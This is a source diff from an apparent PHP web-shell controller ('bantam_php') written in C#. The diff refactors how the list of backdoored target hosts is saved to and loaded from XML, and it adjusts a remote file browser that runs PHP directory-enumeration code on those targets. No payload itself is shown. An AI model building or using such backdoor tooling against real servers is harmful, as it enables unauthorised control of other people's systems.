@@ -45,9 +45,9 @@ namespace bantam_php
 
             //has to be initialized with parameters manually because, constructor with params breaks design mode...
             txtBoxFileBrowserPath.Initialize(btnFileBrowserBack_MouseClick, 21);
-
-            loadhostTargetsFromXML();
         }
+
+
 
         /// <summary>
         /// 
@@ -56,95 +56,13 @@ namespace bantam_php
         /// <param name="e"></param>
         private void saveClientsToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            XmlDocument xmlDoc = new XmlDocument();
-
-            XmlNode rootNode = xmlDoc.CreateElement("servers");
-            xmlDoc.AppendChild(rootNode);
-
-            foreach (KeyValuePair<String, HostInfo> host in Hosts)
-            {
-                HostInfo hostInfo = (HostInfo)host.Value;
-
-                if (hostInfo.Down)
-                {
-                    continue;
-                }
-
-                XmlNode serverNode = xmlDoc.CreateElement("server");
-
-                XmlAttribute hostAttribute = xmlDoc.CreateAttribute("host");
-                hostAttribute.Value = host.Key;
-                serverNode.Attributes.Append(hostAttribute);
-
-                XmlAttribute requestArgAttribute = xmlDoc.CreateAttribute("request_arg");
-                requestArgAttribute.Value = hostInfo.RequestArgName;
-                serverNode.Attributes.Append(requestArgAttribute);
-
-                XmlAttribute requestMethod = xmlDoc.CreateAttribute("request_method");
-                requestMethod.Value = (hostInfo.SendDataViaCookie ? "cookie" : "post" ); //todo post is not the most proper thing it could differ
-                serverNode.Attributes.Append(requestMethod);
-
-                rootNode.AppendChild(serverNode);
-            }
-
-            xmlDoc.Save(CONFIG_FILE);
+            XmlHelper.saveShells();
         }
 
         /// <summary>
         /// 
         /// </summary>
-        public void loadhostTargetsFromXML(string xmlFile = CONFIG_FILE)
-        {
-            //check if config file exists, proceed to load it and select the "servers" into an XmlNodeList
-            if (File.Exists(xmlFile))
-            {
-                XmlDocument xmlDoc = new XmlDocument();
-                xmlDoc.Load(xmlFile);
 
-                XmlNodeList itemNodes = xmlDoc.SelectNodes("//servers/server");
-
-                if (itemNodes.Count > 0)
-                {
-                    //loop through every server
-                    foreach (XmlNode itemNode in itemNodes)
-                    {
-                        //TODO abstract this into process function(s)
-                        //Hot select target onload up
-                        string hostTarget = (itemNode.Attributes?["host"] != null) ? itemNode.Attributes?["host"].Value : "";
-                        string requestArg = (itemNode.Attributes?["request_arg"] != null) ? itemNode.Attributes?["request_arg"].Value : "";
-                        string requestMethod = (itemNode.Attributes?["request_method"] != null) ? itemNode.Attributes?["request_method"].Value : "";
-
-                        //invalid hostTarget/target name
-                        if (string.IsNullOrEmpty(hostTarget))
-                        {
-                            continue;
-                        }
-                        //add the hostTarget to our client class containing infos
-                        Hosts.Add(hostTarget, new HostInfo());
-
-                        //if the request arg is specified in the XML and not set to command
-                        if (string.IsNullOrEmpty(requestArg) == false
-                        && requestArg != "command")
-                        {
-                            Hosts[hostTarget].RequestArgName = requestArg;
-                        }
-
-                        //if the request method is specified in the XML and set to cookie
-                        if (string.IsNullOrEmpty(requestMethod) == false
-                         && requestMethod == "cookie")
-                        {
-                            Hosts[hostTarget].SendDataViaCookie = true;
-                        }
-
-                        //execute ping on current hostTarget iteration
-                        Thread t = new Thread(() => getInitDataThread(hostTarget));
-                        t.Start();
-                    }
-                }
-            } else {
-                MessageBox.Show("Config file (" + CONFIG_FILE + ") is missing.", "Oh... Shied..");
-            }
-        }
 
         private void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
         {
@@ -817,9 +735,11 @@ namespace bantam_php
 
                 if (!string.IsNullOrEmpty(g_SelectedTarget) 
                  && Hosts.ContainsKey(g_SelectedTarget) 
-                 && !string.IsNullOrEmpty(Hosts[g_SelectedTarget].CWD))
+                 && !string.IsNullOrEmpty(Hosts[g_SelectedTarget].PWD)
+                 && !string.IsNullOrEmpty(txtBoxFileBrowserPath.Text))
                 {
-                    Hosts[g_SelectedTarget].CWD = txtBoxFileBrowserPath.Text;
+                    Hosts[g_SelectedTarget].PWD = txtBoxFileBrowserPath.Text;
+                   //MessageBox.Show(Hosts[g_SelectedTarget].PWD);
                 }
 
                 g_SelectedTarget = lvi.SubItems[0].Text;
@@ -879,7 +799,12 @@ namespace bantam_php
                         treeViewFileBrowser.Refresh();
                         treeViewFileBrowser.ExpandAll();
 
-                        txtBoxFileBrowserPath.Text = Hosts[g_SelectedTarget].CWD;
+                        if (string.IsNullOrEmpty(Hosts[g_SelectedTarget].PWD))
+                        {
+                            MessageBox.Show("2");
+                        }
+
+                        txtBoxFileBrowserPath.Text = Hosts[g_SelectedTarget].PWD;
                     } else {
                         start_FileBrowser();
                     }
@@ -911,7 +836,7 @@ namespace bantam_php
                     treeViewFileBrowser.Refresh();
                     treeViewFileBrowser.ExpandAll();
 
-                    txtBoxFileBrowserPath.Text = Hosts[g_SelectedTarget].CWD;
+                    txtBoxFileBrowserPath.Text = Hosts[g_SelectedTarget].PWD;
                 } else {
                     //if the gui treeview is empty, start the filebrowser and display it
                     if (treeViewFileBrowser.Nodes.Count == 0)
@@ -1026,18 +951,15 @@ namespace bantam_php
                     } else {
                         fullPath = txtBoxFileBrowserPath.Text + "/" + path;
                     }
-
-                    
-                    MessageBox.Show(fullPath);
+                   
                     //Get Directory Contents PHP code
                     string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(fullPath, Hosts[g_SelectedTarget].PHP_Version);
 
                     //attempts to execute the directoryContents PHP code on the "target"
-
                     //setup GUI callback to call after request
                     //setup main thread
-                    object[] callbackParams = { g_SelectedTarget, tn };
 
+                    object[] callbackParams = { g_SelectedTarget, tn };
                     startPhpExecutionThread(directoryContentsPHPCode, fileBrowserMouseClickMethod, callbackParams);
                 }
             }
@@ -1487,6 +1409,43 @@ namespace bantam_php
                 MessageBox.Show(remoteIP, "Your IPV4 Address Is");
                 Clipboard.SetText(remoteIP);
             }
+        }
+
+        private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            SaveFileDialog saveShellsXMLDialog = new SaveFileDialog();
+
+            saveShellsXMLDialog.Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml";
+            saveShellsXMLDialog.FilterIndex = 2;
+            saveShellsXMLDialog.RestoreDirectory = true;
+
+            if (saveShellsXMLDialog.ShowDialog() == DialogResult.OK)
+            {
+                XmlHelper.saveShells(saveShellsXMLDialog.FileName);
+            }
+        }
+
+        private void openToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog openShellXMLDialog = new OpenFileDialog();
+            openShellXMLDialog.Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml";
+            openShellXMLDialog.FilterIndex = 2;
+            openShellXMLDialog.RestoreDirectory = true;
+
+            if (openShellXMLDialog.ShowDialog() == DialogResult.OK)
+            {
+                foreach (ListViewItem lvClients in listViewClients.Items)
+                {
+                    Hosts.Remove(lvClients.Text);
+                    lvClients.Remove();
+                }
+                XmlHelper.loadShells(openShellXMLDialog.FileName);
+            }
+        }
+
+        private void BantamMain_Load(object sender, EventArgs e)
+        {
+            XmlHelper.loadShells();
         }
 
         private void editToolStripMenuItem_Click(object sender, EventArgs e)
